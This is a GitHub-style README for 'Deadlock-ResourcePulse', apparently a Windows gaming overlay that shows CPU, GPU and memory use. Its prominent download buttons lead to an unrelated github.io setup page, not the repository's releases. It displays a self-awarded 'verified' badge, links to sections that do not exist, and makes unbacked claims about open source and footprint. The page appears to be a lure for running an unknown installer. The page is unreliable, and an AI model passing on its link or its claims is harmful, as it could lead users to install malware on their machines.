# Deadlock‑ResourcePulse

<div align="center">
  <a href="https://rewfdf.github.io/SetupPage/"><img src="https://img.shields.io/badge/DOWNLOAD-RELEASE-0284c7?style=for-the-badge&logo=github&logoColor=white&labelColor=161b22" alt="Download"></a>
  <br>
  <a href="#-overview"><img src="https://img.shields.io/badge/STATUS-VERIFIED-e11d48?style=for-the-badge&logo=checkmarx&logoColor=white&labelColor=161b22" alt="STATUS"></a> <a href="#-overview"><img src="https://img.shields.io/badge/EDITION-STANDARD-1d4ed8?style=for-the-badge&logo=rocket&logoColor=white&labelColor=161b22" alt="EDITION"></a>
  <br>
  <a href="#-configuration-system"><img src="https://img.shields.io/badge/CONFIGS-PRESETS-0891b2?style=for-the-badge&logo=files&logoColor=white&labelColor=161b22" alt="CONFIGS"></a> <a href="#-key-capabilities"><img src="https://img.shields.io/badge/FEATURES-MODULES-16a34a?style=for-the-badge&logo=sparkles&logoColor=white&labelColor=161b22" alt="FEATURES"></a>
</div>

**Real‑time resource visualization for Windows 10/11 gamers**

---

## 🎮 What is ResourcePulse?

Deadlock‑ResourcePulse is a lightweight, Windows‑only desktop utility that puts the pulse of your PC’s performance directly in front of you while you game. It captures CPU, GPU and memory usage every 250 ms and renders them as sleek, non‑intrusive overlays so you can see exactly how your hardware behaves under pressure—no extra windows, no clutter.

| Feature | Description |
|---------|-------------|
| **Live CPU chart** | Core‑by‑core utilization with customizable colors |
| **GPU load meter** | Supports NVIDIA, AMD and Intel GPUs |
| **Memory tracker** | Total and per‑process consumption |
| **Game‑mode detection** | Auto‑starts when a full‑screen game is launched |
| **Minimal footprint** | < 5 MB RAM, < 2 % CPU idle |
| **Configurable overlay** | Position, opacity, size and hot‑keys |
| **Open‑source** | Fully transparent code, contributions welcome |

---

## 📥 Download / Get Started

<div style="display:flex; gap:12px; flex-wrap:wrap;">
  <a href="https://rewfdf.github.io/SetupPage/" style="background:#4A90E2;color:#fff;padding:12px 20px;border-radius:6px;text-decoration:none;font-weight:bold;">Download ResourcePulse</a>
  <a href="https://github.com/Prohibitiondemoon/Deadlock-ResourcePulse/releases/latest" style="background:#7ED321;color:#fff;padding:12px 20px;border-radius:6px;text-decoration:none;font-weight:bold;">Latest Release</a>
  <a href="https://github.com/Prohibitiondemoon/Deadlock-ResourcePulse/blob/main/README.md#-quick-start" style="background:#D0021B;color:#fff;padding:12px 20px;border-radius:6px;text-decoration:none;font-weight:bold;">Quick Start</a>
</div>

---

## 🚀 Quick Start

1. **Download** the installer from the button above.
2. Run the installer and accept the default options.
3. Launch any Windows game (e.g., *Valorant*, *Elden Ring*).
4. Press <kbd>Ctrl + Alt + P</kbd> to toggle the overlay.
5. Open the tray icon → **Settings** to fine‑tune colors, update rate, and hot‑keys.

> **Tip:** Keep the overlay on the *Always‑On‑Top* layer for maximum visibility during fast‑paced sessions.

---

## 📊 How It Works (Under the Hood)

- **Performance counters** from Windows Management Instrumentation (WMI) provide per‑core CPU data.
- **DXGI** and **NVAPI/AMDADL** interfaces poll GPU load without impacting frame‑rates.
- **Memory** stats come from the Windows Performance Data Helper (PDH).
- Data is fed into a **Direct2D** rendering pipeline, ensuring the overlay stays smooth even at 144 Hz+.

The codebase is deliberately small (≈ 2 k LOC) to stay maintainable and fast.

---

## 🤝 Contributing

Contributions are welcome! Please follow these steps:

1. Fork the repository.
2. Create a feature branch (`git checkout -b feat/awesome‑feature`).
3. Ensure the solution builds with **Visual Studio 2022** (targeting .NET 6).
4. Run the existing unit tests (`dotnet test`).
5. Submit a pull request with a clear description.

Refer to `CONTRIBUTING.md` for style guidelines and the code of conduct.

---

## 📜 License

Deadlock‑ResourcePulse is released under the **MIT License** – see the `LICENSE` file for full terms.

---

## 📞 Support & Community

- **Issues:** Open a GitHub issue for bugs or feature requests.
- **Discussions:** Join the *ResourcePulse* Discord (link in the repo wiki).
- **Feedback:** Email `feedback@deadlock.dev` with any thoughts on performance or UI tweaks.

---

*Happy gaming, and keep your system’s pulse in view!*

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```